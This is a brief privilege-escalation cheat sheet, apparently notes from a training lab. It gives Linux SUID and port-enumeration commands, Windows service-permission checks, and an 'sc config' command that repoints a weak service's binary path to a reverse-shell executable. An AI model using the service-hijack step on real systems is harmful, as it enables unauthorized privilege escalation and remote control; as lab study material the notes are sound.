You can find all SUID file by executing this simple find command:

find / -perm -u=s -type f 2>/dev/null

netstat -at | less
netstat -tulpn


windows get permissions of given service via sysinternals

accesschk.exe /accepteula -uwcqv user daclsvc


check service data (user, path, etc)

sc qc daclsvc

change bin path

sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
